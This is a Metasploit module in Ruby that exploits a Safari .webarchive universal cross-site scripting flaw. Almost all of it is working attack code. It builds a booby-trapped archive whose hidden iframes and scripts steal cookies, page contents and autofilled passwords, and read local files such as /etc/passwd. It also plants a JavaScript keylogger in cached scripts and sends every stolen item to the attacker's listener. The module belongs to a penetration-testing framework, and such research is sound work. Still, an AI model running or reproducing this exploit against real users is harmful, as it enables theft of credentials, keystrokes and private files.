##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# web site for more information on licensing and terms of use.
#   http://metasploit.com/
##

require 'msf/core'
require 'open-uri'

class Metasploit3 < Msf::Auxiliary

	include Msf::Exploit::FILEFORMAT
	include Msf::Exploit::Remote::HttpServer::HTML

	# [Array<Array<Hash>>] list of poisonable scripts per user-specified URLS
	attr_accessor :scripts_to_poison

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'Apple Safari .webarchive File Format UXSS',
			'Description'    => %q{
				This module exploits a security context vulnerability that is inherent
				in Safari's .webarchive file format. The format allows you to
				specify both domain and content, so we can run arbitrary script in the
				context of any domain. This allows us to steal cookies, file URLs, and saved
				passwords from any website we want -- in other words, it is a universal
				cross-site scripting vector (UXSS). On sites that link to cached javascripts,
				we can additionally poison user's browser cache and install keyloggers.
			},
			'License'        => MSF_LICENSE,
			'Author'         => 'joev',
			'References'     =>
				[
					['URL', 'https://community.rapid7.com/community/metasploit/blog/2013/04/25/abusing-safaris-webarchive-file-format']
				],
			'DisclosureDate' => 'Feb 22 2013',
			'Actions'     =>
				[
					[ 'WebServer' ]
				],
			'PassiveActions' =>
				[
					'WebServer'
				],
			'DefaultAction'  => 'WebServer'))

		register_options(
			[
				OptString.new('FILENAME', [ true, 'The file name.',  'msf.webarchive']),
				OptString.new('URLS', [ true, 'A space-delimited list of URLs to UXSS (eg http//browserscan.rapid7.com/']),
				OptString.new('URIPATH', [false, 'The URI to receive the UXSS\'ed data', '/grab']),
				OptString.new('DOWNLOAD_PATH', [ true, 'The path to download the webarhive.', '/msf.webarchive']),
				OptString.new('URLS', [ true, 'The URLs to steal cookie and form data from.', '']),
				OptString.new('FILE_URLS', [false, 'Additional file:// URLs to steal.', '']),
				OptBool.new('STEAL_COOKIES', [true, "Enable cookie stealing.", true]),
				OptBool.new('STEAL_FILES', [true, "Enable local file stealing.", true]),
				OptBool.new('INSTALL_KEYLOGGERS', [true, "Attempt to poison the user's cache with a javascript keylogger.", true]),
				OptBool.new('STEAL_FORM_DATA', [true, "Enable form autofill stealing.", true]),
				OptBool.new('ENABLE_POPUPS', [false, "Enable the popup window fallback method for stealing form data.", true])
			],
			self.class)
	end

	def run
		if should_install_keyloggers?
			print_status("Fetching URLs to parse and look for cached assets...")
			self.scripts_to_poison = find_cached_scripts
		end
		print_status("Creating '#{datastore['FILENAME']}' file...")
		file_create(webarchive_xml)
		print_status("Running WebServer...")
		start_http
	end

	def cleanup
		super
		# clear my resource, deregister ref, stop/close the HTTP socket
		begin
			@http_service.remove_resource(collect_data_uri)
			@http_service.deref
			@http_service.stop
			@http_service.close
			@http_service = nil
		rescue
		end
	end

	#
	# Ensures that gzip can be used.  If not, an exception is generated.  The
	# exception is only raised if the DisableGzip advanced option has not been
	# set.
	#
	def use_zlib
		if (!Rex::Text.zlib_present? and datastore['HTTP::compression'] == true)
			raise RuntimeError, "zlib support was not detected, yet the HTTP::compression option was set.  Don't do that!"
		end
	end

	#
	# Handle the HTTP request and return a response.  Code borrorwed from:
	# msf/core/exploit/http/server.rb
	#
	def start_http(opts={})
		# Ensture all dependencies are present before initializing HTTP
		use_zlib

		comm = datastore['ListenerComm']
		if (comm.to_s == "local")
			comm = ::Rex::Socket::Comm::Local
		else
			comm = nil
		end

		# Default the server host / port
		opts = {
			'ServerHost' => datastore['SRVHOST'],
			'ServerPort' => datastore['SRVPORT'],
			'Comm'       => comm
		}.update(opts)

		# Start a new HTTP server
		@http_service = Rex::ServiceManager.start(
			Rex::Proto::Http::Server,
			opts['ServerPort'].to_i,
			opts['ServerHost'],
			datastore['SSL'],
			{
				'Msf'        => framework,
				'MsfExploit' => self,
			},
			opts['Comm'],
			datastore['SSLCert']
		)

		@http_service.server_name = datastore['HTTP::server_name']

		# Default the procedure of the URI to on_request_uri if one isn't
		# provided.
		uopts = {
			'Proc' => Proc.new { |cli, req|
				on_request_uri(cli, req)
			},
			'Path' => collect_data_uri
		}.update(opts['Uri'] || {})

		proto = (datastore["SSL"] ? "https" : "http")
		print_status("Data capture URL: #{proto}://#{opts['ServerHost']}:#{opts['ServerPort']}#{uopts['Path']}")

		if (opts['ServerHost'] == '0.0.0.0')
			print_status(" Local IP: #{proto}://#{Rex::Socket.source_address('1.2.3.4')}:#{opts['ServerPort']}#{uopts['Path']}")
		end

		# Add path to resource
		@service_path = uopts['Path']
		@http_service.add_resource(uopts['Path'], uopts)

		# Add path to download
		uopts = {
			'Proc' => Proc.new { |cli, req|
				resp = Rex::Proto::Http::Response::OK.new
				resp['Content-Type'] = 'application/x-webarchive'
				resp.body = @xml.to_s
				cli.send_response resp
			},
			'Path' => webarchive_download_url
		}.update(opts['Uri'] || {})
		@http_service.add_resource(webarchive_download_url, uopts)

		print_status("Download URL: #{proto}://#{opts['ServerHost']}:#{opts['ServerPort']}#{webarchive_download_url}")

		# As long as we have the http_service object, we will keep the ftp server alive
		while @http_service
			select(nil, nil, nil, 1)
		end
	end

	def on_request_uri(cli, request)
		begin
			data = if request.body.size > 0
				request.body
			else
				request.qstring['data']
			end
			data = JSON::parse(data || '')
			print_status "Received data: #{data}"
		rescue # json error, dismiss request & keep crit. server up
		end
	end

	### ASSEMBLE THE WEBARCHIVE XML ###

	# @return [String] contents of webarchive as an XML document
	def webarchive_xml
		return @xml if not @xml.nil? # only compute xml once
		@xml = webarchive_header
		urls.each_with_index { |url, idx| @xml << webarchive_iframe(url, idx) }
		@xml << webarchive_footer
	end

	# @return [String] the first chunk of the webarchive file, containing the WebMainResource
	def webarchive_header
		%Q|
			<?xml version="1.0" encoding="UTF-8"?>
			<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN"
				"http://www.apple.com/DTDs/PropertyList-1.0.dtd">
			<plist version="1.0">
			<dict>
				<key>WebMainResource</key>
				<dict>
					<key>WebResourceData</key>
					<data>
						#{Rex::Text.encode_base64(iframes_container_html)}</data>
					<key>WebResourceFrameName</key>
					<string></string>
					<key>WebResourceMIMEType</key>
					<string>text/html</string>
					<key>WebResourceTextEncodingName</key>
					<string>UTF-8</string>
					<key>WebResourceURL</key>
					<string>file:///</string>
				</dict>
				<key>WebSubframeArchives</key>
				<array>
		|
	end

	# @return [String] the XML markup to insert into the webarchive for each unique
	#   iframe (we use one frame per site we want to steal)
	def webarchive_iframe(url, idx)
		%Q|
			<dict>
				<key>WebMainResource</key>
				<dict>
					<key>WebResourceData</key>
					<data>
					#{Rex::Text.encode_base64(iframe_content_for_url(url))}</data>
					<key>WebResourceFrameName</key>
					<string>&lt;!--framePath //&lt;!--frame#{idx}--&gt;--&gt;</string>
					<key>WebResourceMIMEType</key>
					<string>text/html</string>
					<key>WebResourceTextEncodingName</key>
					<string>UTF-8</string>
					<key>WebResourceURL</key>
					<string>#{escape_xml url}</string>
				</dict>
				#{webarchive_iframe_subresources(url, idx)}
			</dict>
		|
	end

	# @return [String] the XML mark up for adding a set of "stored" resources at
	#   the given URLs
	def webarchive_iframe_subresources(url, idx)
		%Q|
			<key>WebSubresources</key>
			<array>
				#{webarchive_resources_for_poisoning_cache(url)}
			</array>
		|
	end

	# @return [String] the XML markup to insert into the webarchive for each unique
	#   iframe (we use one frame per site we want to steal)
	# @return '' if msf user does not want to poison cache
	def webarchive_resources_for_poisoning_cache(url)
		if not should_install_keyloggers? then return '' end

		url_idx = urls.index(url)
		scripts = scripts_to_poison[url_idx] || []
		xml_dicts = scripts.map do |script|
			script_body = inject_js_keylogger(script[:body])
			%Q|
			<dict>
				<key>WebResourceData</key>
				<data>
				#{Rex::Text.encode_base64(script_body)}
				</data>
				<key>WebResourceMIMEType</key>
				<string>application/javascript</string>
				<key>WebResourceResponse</key>
				<data>
				#{Rex::Text.encode_base64 web_response_xml(script)}
				</data>
				<key>WebResourceURL</key>
				<string>#{escape_xml script[:url]}</string>
			</dict>
			|
		end
		xml_dicts.join
	end

	# @return [String] the closing chunk of the webarchive XML code
	def webarchive_footer
		%Q|
				</array>
			</dict>
			</plist>
		|
	end

	# @param [script] hash containing HTTP headers from the request
	# @return [String] xml markup for serialized WebResourceResponse containing good
	#   stuff like HTTP/caching headers. Safari appears to do the following:
	#    NSKeyedArchiver *a = [[NSKeyedArchiver alloc] initForWritingWithMutableData:data];
	#    [a encodeObject:response forKey:@"WebResourceResponse"];
	def web_response_xml(script)
		# this is a serialized NSHTTPResponse, i'm too lazy to write a
		#   real encoder so yay lets use string interpolation.
		# ripped this straight out of a webarchive save
		script['content-length'] = script[:body].length
		whitelist = %w(content-type content-length date etag
										Last-Modified cache-control expires)
		headers = script.clone.delete_if { |k, v| not whitelist.include? k }

		key_set = headers.keys.sort
		val_set = key_set.map { |k| headers[k] }
		key_refs = key_set.each_with_index.map do |k, i|
			{ 'CF$UID' => 9+i }
		end
		val_refs = key_set.each_with_index.map do |k, i|
			{ 'CF$UID' => 9+key_set.length+i }
		end
	%Q|
		<?xml version="1.0" encoding="UTF-8"?>
		<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
		<plist version="1.0">
		<dict>
			<key>$archiver</key>
			<string>NSKeyedArchiver</string>
			<key>$objects</key>
			<array>
				<string>$null</string>
				<dict>
					<key>$0</key>
					<integer>8</integer>
					<key>$1</key>
					<integer>1</integer>
					<key>$10</key>
					<integer>8</integer>
					<key>$11</key>
					<integer>0</integer>
					<key>$2</key>
					<integer>7</integer>
					<key>$3</key>
					<dict>
						<key>CF$UID</key>
						<integer>2</integer>
					</dict>|+
					(4..7).map do |i|
						%Q|
							<key>$#{i}</key>
							<dict>
								<key>CF$UID</key>
								<integer>#{i+1}</integer>
							</dict>|
					end.join("\n") + %Q|
					<key>$8</key>
					<dict>
						<key>CF$UID</key>
						<integer>#{8+key_set.length*2+2}</integer>
					</dict>
					<key>$9</key>
					<dict>
						<key>CF$UID</key>
						<integer>0</integer>
					</dict>
					<key>$class</key>
					<dict>
						<key>CF$UID</key>
						<integer>#{8+key_set.length*2+3}</integer>
					</dict>
				</dict>
				<dict>
					<key>$class</key>
					<dict>
						<key>CF$UID</key>
						<integer>4</integer>
					</dict>
					<key>NS.base</key>
					<dict>
						<key>CF$UID</key>
						<integer>0</integer>
					</dict>
					<key>NS.relative</key>
					<dict>
						<key>CF$UID</key>
						<integer>3</integer>
					</dict>
				</dict>
				<string>#{escape_xml script[:url]}</string>
				<dict>
					<key>$classes</key>
					<array>
						<string>NSURL</string>
						<string>NSObject</string>
					</array>
					<key>$classname</key>
					<string>NSURL</string>
				</dict>
				<real>388430153.25252098</real>
				<integer>1</integer>
				<integer>200</integer>
				<dict>
					<key>$class</key>
					<dict>
						<key>CF$UID</key>
						<integer>#{8+key_set.length*2+1}</integer>
					</dict>
					<key>NS.keys</key>
					<array>|+
					key_set.each_with_index.map do |k, i|
						%Q|<dict>
							<key>CF$UID</key>
							<integer>#{9+i}</integer>
						</dict>|
					end.join("\n") + %Q|
					</array>
					<key>NS.objects</key>
					<array>|+
					val_set.each_with_index.map do |k, i|
						%Q|<dict>
							<key>CF$UID</key>
							<integer>#{9+key_set.length+i}</integer>
						</dict>|
					end.join("\n") + %Q|
					</array>
				</dict>
				#{key_set.map{|s| "<string>#{s}</string>" }.join("\n")}
				#{val_set.map{|s| "<string>#{s}</string>" }.join("\n")}
				<dict>
					<key>$classes</key>
					<array>
						<string>NSMutableDictionary</string>
						<string>NSDictionary</string>
						<string>NSObject</string>
					</array>
					<key>$classname</key>
					<string>NSMutableDictionary</string>
				</dict>
				<integer>107961</integer>
				<dict>
					<key>$classes</key>
					<array>
						<string>NSHTTPURLResponse</string>
						<string>NSURLResponse</string>
						<string>NSObject</string>
					</array>
					<key>$classname</key>
					<string>NSHTTPURLResponse</string>
				</dict>
			</array>
			<key>$top</key>
			<dict>
				<key>WebResourceResponse</key>
				<dict>
					<key>CF$UID</key>
					<integer>1</integer>
				</dict>
			</dict>
			<key>$version</key>
			<integer>100000</integer>
		</dict>
		</plist>
		|
	end


	#### JS/HTML CODE ####

	# Wraps the result of the block in an HTML5 document and body
	def wrap_with_doc(&blk)
		%Q|
			<!doctype html>
			<html>
				<body>
					#{yield}
				</body>
			</html>
		|
	end

	# Wraps the result of the block with <script> tags
	def wrap_with_script(&blk)
		"<script>#{yield}</script>"
	end

	# @return [String] mark up for embedding the iframes for each URL in a place that is
	#   invisible to the user
	def iframes_container_html
		hidden_style = "position:fixed; left:-600px; top:-600px;"
		wrap_with_doc do
			frames = urls.map { |url| "<iframe src='#{url}' style='#{hidden_style}'></iframe>" }
			communication_js + frames.join + injected_js_helpers + steal_files + message
		end
	end

	# @return [String] javascript code, wrapped in script tags, that is inserted into the
	#   WebMainResource (parent) frame so that child frames can communicate "up" to the parent
	#   and send data out to the listener
	def communication_js
		wrap_with_script do
			%Q|
				window.addEventListener('message', function(event){
					var x = new XMLHttpRequest;
					x.open('POST', '#{backend_url}#{collect_data_uri}', true);
					x.send(event.data);
				});
			|
		end
	end

	# @return [String] all the HTML markup required for executing the chosen attacks
	def iframe_content_for_url(url)
		# this JS code runs inside the iframes, in the context of url
		html = ''
		html << injected_js_helpers
		html << trigger_cache_poison_for_url(url) if should_install_keyloggers?
		html << steal_cookies_for_url(url)        if should_steal_cookies?
		html << steal_form_data_for_url(url)      if should_steal_form?
		wrap_with_doc { html }
	end

	# @return [String] javascript code, wrapped in a script tag, that steals the cookies
	#  and response body/headers, and passes them back up to the parent.
	def steal_cookies_for_url(url)
		wrap_with_script do
			%Q|
				try {
					var req = new XMLHttpRequest();
					var sent = false;
					req.open('GET', '#{url}', true);
					req.onreadystatechange = function() {
						if (!sent) {
							sendData('response_headers', req.getAllResponseHeaders());
							sendData('response_body', req.responseText);
							sent = true;
						}
					};
					req.send(null);
				} catch (e) {}
				sendData('cookie', document.cookie);
			|
		end
	end

	# @return [String] javascript code, wrapped in a script tag, that steals local files
	#   and sends them back to the listener. This code is executed in the WebMainResource (parent)
	#   frame, which runs in the file:// protocol
	def steal_files
		return '' unless should_steal_files?
		urls_str = [datastore['FILE_URLS'], interesting_file_urls.join(' ')].join(' ')
		wrap_with_script do
			%Q|
				var filesStr = "#{urls_str}";
				var files = filesStr.trim().split(/\s+/);
				var stealFile = function(url) {
					var req = new XMLHttpRequest();
					var sent = false;
					req.open('GET', url, true);
					req.onreadystatechange = function() {
						if (!sent && req.responseText && req.responseText.length > 0) {
							sendData(url, req.responseText);
							sent = true;
						}
					};
					req.send(null);
				};
				for (var i = 0; i < files.length; i++) stealFile(files[i]);
			|
		end
	end

	# @return [String] javascript code, wrapped in a script tag, that steals autosaved form
	#   usernames and passwords. The attack first tries to render the target URL in an iframe,
	#   and steal populated passwords from there. If the site disables iframes through the
	#   X-Frame-Options header, we try popping open a new window and rendering the site in that.
	def steal_form_data_for_url(url)
		wrap_with_script do
			%Q|
				var stealFormData = function(win, completeFn) {
					var doc = win.document;
					if (!doc) doc = win.contentDocument;
					return function() {
						var data = {}, found = false;
						try {
							var inputs = doc.querySelectorAll(
								'input[type=email],input[type=text],input[type=password],textarea'
							);
							for (var i = 0; i < inputs.length; i++) {
								if (inputs[i].value && inputs[i].value.length > 0) {
									found = true;
									data[inputs[i].name] = inputs[i].value;
								}
							}
							if (found) sendData(data);
							if (completeFn) completeFn.call();
						} catch(e) {}
					}
				}

				var tryInNewWin = function() {
					var y = window.open('#{url}', '_blank', 'height=0;width=0;location=0;left=200;');
					if (y) {
						var int1 = window.setInterval(function(){y.blur();window.top.focus();}, 20);
						y.addEventListener('load', function() {
							window.setTimeout(stealFormData(y, function(){
								if (int1) {
									window.clearInterval(int1);
									int1 = null;
								}
								y.close();
							}), 500);
						}, false);
					}
				};
				var tryInIframe = function(){
					var i = document.createElement('iframe');
					i.style = 'position:absolute;width:2px;height:2px;left:-2000px;top:-2000px;';
					document.body.appendChild(i);
					i.src = '#{url}';
					i.addEventListener('load', function() {
						window.setTimeout(stealFormData(i), 500);
					}, false);
					return i;
				};

				var iframe = tryInIframe();
				if (#{should_pop_up?}) {
					window.setTimeout(function(){

						if (iframe.contentDocument &&
								iframe.contentDocument.location.href == 'about:blank') {
							tryInNewWin();
						}
					}, 1000)
				}
			|
		end
	end

	# @return [String] javascript code, wrapped in script tag, that adds a helper function
	#   called "sendData()" that passes the arguments up to the parent frame, where it is
	#   sent out to the listener
	def injected_js_helpers
		wrap_with_script do
			%Q|
				window.sendData = function(key, val) {
					var data = {};
					if (key && val) data[key] = val;
					if (!val)       data = key;
					window.top.postMessage(JSON.stringify(data), "*")
				};
			|
		end
	end

	# @return [String] HTML markup that includes a script at the URL we want to poison
	#   We will then install the injected_js_keylogger at the same URL
	def trigger_cache_poison_for_url(url)
		url_idx = urls.index(url)
		scripts_to_poison[url_idx].map { |s|
			"\n<script src='#{s[:url]}' type='text/javascript'></script>\n"
		}.join
	end

	# @param [String] original_js the original contents of the script file
	# @return [String] the poisoned contents. Once the module has found a valid 304'd script to
	#   poison, it "poisons" it by adding a keylogger, then adds the output as a resource with
	#   appropriate Cache-Control to the webarchive.
	# @return [String] the original contents if msf user does not want to install keyloggers
	def inject_js_keylogger(original_js)
		if not should_install_keyloggers?
			original_js
		else
			frame_name = 'lalala___lalala'
			secret = '____INSTALLED!??!'
			%Q|
				(function(){
					if (window['#{secret}']) return;
					window['#{secret}'] = true;
					document.addEventListener('DOMContentLoaded',function(){
						var buffer = '';
						var sendData = function(keystrokes, time) {
							var img = new Image();
							data = JSON.stringify({keystrokes: keystrokes, time: time});
							img.src = '#{backend_url}#{collect_data_uri}?data='+data;
						}
						document.addEventListener('keydown', function(e) {
							var c = String.fromCharCode(e.keyCode);
							if (c.length > 0) buffer += c;
						}, true);
						window.setInterval(function(){
							if (buffer.length > 0) {
								sendData(buffer, new Date);
								buffer = '';
							}
						}, 3000)
					});
				})();
				#{original_js}
			|
		end
	end

	# @return [Array<Array<String>>] list of URLs provided by the user mapped to all of the linked
	#   javascript assets in its HTML response.
	def all_script_urls(pages)
		pages.map do |url|
			results = []
			print_status "Fetching URL #{url}..."
			# fetch and parse the HTML document
			doc = Nokogiri::HTML(open(url))
			# recursively add scripts from iframes
			doc.css('iframe').each do |iframe|
				print_status "Checking iframe..."
				if not iframe.attributes['src'].nil? and not iframe.attributes['src'].value.empty?
					results += all_script_urls([iframe.attributes['src'].value])
				end
			end
			# add all scripts on the current page
			doc.css('script').each do |script| # loop over every <script>
				# external scripts only
				if not script.attributes['src'].nil? and not script.attributes['src'].value.empty?
					results << script.attributes['src'].value
				end
			end
			results
		end
	end

	# @return [Array<Array<Hash>>] list of headers returned by cacheabke remote javascripts
	def find_cached_scripts
		cached_scripts = all_script_urls(urls).each_with_index.map do |urls_for_site, i|
			begin
				page_uri = URI.parse(urls[i])
			rescue URI::InvalidURIError => e
				next
			end

			results = urls_for_site.uniq.map do |url|
				begin
					print_status "URL: #{url}"
					begin
						script_uri = URI.parse(url)
						if script_uri.relative?
							url = page_uri + url
						end
						io = open(url)
					rescue URI::InvalidURIError => e
						next
					end

					# parse some HTTP headers and do type coercions
					last_modified = io.last_modified
					expires = Time.parse(io.meta['expires']) rescue nil
					cache_control = io.meta['cache-control'] || ''
					charset = io.charset
					etag = io.meta['etag']
					# lets see if we are able to "poison" the cache for this asset...
					if (!expires.nil? && Time.now < expires) or
							(cache_control.length > 0) or   # if asset is cacheable
							(not last_modified.nil? and last_modified.to_s.length > 0)
						print_status("Found cacheable #{url}")
						io.meta.merge(:body => io.read, :url => url)
					else
						nil
					end
				rescue Errno::ENOENT => e # lots of things can go wrong here.
					next
				end
			end
			results.compact # remove nils
		end
		print_status "Found #{cached_scripts.flatten.length} script(s) that are poisonable."
		cached_scripts
	end

	### HELPERS ###

	# @return [String] the path to send data back to
	def collect_data_uri
		path = datastore["URIPATH"]
		if path.nil? or path.empty?
			'/grab'
		elsif path =~ /^\//
			path
		else
			"/#{path}"
		end
	end

	# @return [String] formatted http/https URL of the listener
	def backend_url
		proto = (datastore["SSL"] ? "https" : "http")
		myhost = (datastore['SRVHOST'] == '0.0.0.0') ? Rex::Socket.source_address : datastore['SRVHOST']
		port_str = (datastore['SRVPORT'].to_i == 80) ? '' : ":#{datastore['SRVPORT']}"
		"#{proto}://#{myhost}#{port_str}"
	end

	# @return [String] URL that serves the malicious webarchive
	def webarchive_download_url
		datastore["DOWNLOAD_PATH"]
	end

	# @return [Array<String>] of interesting file URLs to steal. Additional files can be stolen
	#   via the FILE_URLS module option.
	def interesting_file_urls
		[
			'file:///var/log/weekly.out', # may contain usernames
			'file:///private/var/log/secure.log',
			'file:///private/var/log/install.log',
			'file:///private/etc/passwd'
		]
	end

	# @return [String] HTML content that is rendered in the <body> of the webarchive.
	def message
		"<p>You are being redirected. <a href='#'>Click here if nothing happens</a>.</p>"
	end

	# @return [Array<String>] of URLs provided by the user
	def urls
		(datastore['URLS'] || '').split(/\s+/)
	end

	# @param [String] input the unencoded string
	# @return [String] input with dangerous chars replaced with xml entities
	def escape_xml(input)
		input.to_s.gsub("&", "&amp;").gsub("<", "&lt;")
							.gsub(">", "&gt;").gsub("'", "&apos;")
							.gsub("\"", "&quot;")
	end

	def should_steal_cookies?
		datastore['STEAL_COOKIES']
	end

	def should_steal_form?
		datastore['STEAL_FORM_DATA']
	end

	def should_steal_files?
		datastore['STEAL_FILES']
	end

	def should_pop_up?
		should_steal_form? and datastore['ENABLE_POPUPS']
	end

	def should_install_keyloggers?
		datastore['INSTALL_KEYLOGGERS']
	end
end
